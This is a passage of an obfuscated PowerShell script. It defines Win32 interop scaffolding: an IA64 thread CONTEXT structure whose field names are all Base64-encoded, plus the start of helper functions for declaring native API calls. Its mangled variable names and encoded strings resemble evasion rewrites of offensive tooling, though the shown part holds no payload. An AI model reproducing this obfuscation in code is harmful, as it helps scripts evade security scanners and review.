        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA5ADUA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x660)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA5ADYA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x670)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA5ADcA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x680)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA5ADgA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x690)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA5ADkA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x6a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADAAMAA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x6b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADAAMQA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x6c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADAAMgA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x6d0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADAAMwA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x6e0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADAANAA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x6f0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADAANQA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x700)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADAANgA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x710)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADAANwA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x720)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADAAOAA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x730)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADAAOQA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x740)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADEAMAA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x750)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADEAMQA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x760)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADEAMgA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x770)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADEAMwA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x780)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADEANAA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x790)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADEANQA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x7a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADEANgA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x7b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADEANwA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x7c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADEAOAA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x7d0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADEAOQA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x7e0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADIAMAA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x7f0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADIAMQA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x800)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADIAMgA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x810)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADIAMwA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x820)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADIANAA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x830)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADIANQA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x840)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADIANgA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x850)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAxADIANwA='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x860)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AEYAUABTAFIA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x870)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQARwBwAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x870)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAwAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x880)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAxAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x888)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAUwAwAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x890)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAUwAxAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x898)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAUwAyAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAUwAzAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8a8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVgAwAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAyAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8b8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAzAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAA0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8c8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAUwBwAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8d0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVABlAGIA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8d8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAA1AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8e0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAA2AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8e8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAA3AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8f0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAA4AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x8f8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAA5AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x900)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAxADAA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x908)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAxADEA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x910)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAxADIA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x918)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAxADMA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x920)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAxADQA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x928)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAxADUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x930)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAxADYA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x938)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAxADcA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x940)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAxADgA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x948)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAxADkA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x950)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAyADAA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x958)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAyADEA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x960)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAVAAyADIA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x968)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQATgBhAHQAcwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x970)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAZABzAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x978)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgByAFIAcAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x980)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgByAFMAMAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x988)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgByAFMAMQA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x990)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgByAFMAMgA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x998)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgByAFMAMwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgByAFMANAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9a8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgByAFQAMAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgByAFQAMQA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9b8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAFUATgBBAFQA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAEwAQwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9c8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAEUAQwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9d0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAEMAQwBWAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9d8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAEQAQwBSAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9e0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBzAFAARgBTAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9e8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBzAEIAUwBQAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9f0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBzAEIAUwBQAFMAVABPAFIARQA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x9f8)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBzAFIAUwBDAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa00)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBzAFIATgBBAFQA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa08)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AEkAUABTAFIA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa10)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AEkASQBQAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa18)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AEkARgBTAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa20)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AEYAQwBSAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa28)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBmAGwAYQBnAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa30)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcAQwBTAEQA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa38)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcAUwBTAEQA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa40)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBmAGwAYQBnAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa48)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AEYAUwBSAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa50)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AEYASQBSAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa58)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AEYARABSAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa60)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAFUAUwBFAEQAUABBAEMASwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0xa68)
        ${Global:/==\/===\_/\/===\} = ${__/\_/\___/\_____}.CreateType()
        function local:func {
            Param (
                [Parameter(Position = 0, Mandatory = $true)]
                [String]${___/====\___/=====},
                [Parameter(Position = 1, Mandatory = $true)]
                [string]${__/====\/\__/\/==\},
                [Parameter(Position = 2, Mandatory = $true)]
                [Type]${______/=\_/\/\/\/\},
                [Parameter(Position = 3)]
                [Type[]]${__/\_/\/=\__/=\/\_},
                [Parameter(Position = 4)]
                [Runtime.InteropServices.CallingConvention]${__/\___/\___/\/\/=},
                [Parameter(Position = 5)]
                [Runtime.InteropServices.CharSet]${_______/==\/\__/\_},
                [Parameter()]
                [Switch]${___/=\/==\/\/=\_/=}
            )
            ${___/===\/=\/==\__} = @{
                DllName      = ${___/====\___/=====}
                FunctionName = ${__/====\/\__/\/==\}
                ReturnType   = ${______/=\_/\/\/\/\}
            }
            if (${__/\_/\/=\__/=\/\_}) { ${___/===\/=\/==\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAGUAdABlAHIAVAB5AHAAZQBzAA==')))] = ${__/\_/\/=\__/=\/\_} }
            if (${__/\___/\___/\/\/=}) { ${___/===\/=\/==\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUAQwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA==')))] = ${__/\___/\___/\/\/=} }
            if (${_______/==\/\__/\_}) { ${___/===\/=\/==\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBzAGUAdAA=')))] = ${_______/==\/\__/\_} }
            if (${___/=\/==\/\/=\_/=}) { ${___/===\/=\/==\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA')))] = ${___/=\/==\/\/=\_/=} }
            New-Object -TypeName PSObject -Property ${___/===\/=\/==\__}
        }
        function local:Add-Win32Type {
            [OutputType([Hashtable])]
            Param(
                [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
                [String]${___/====\___/=====},
                [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
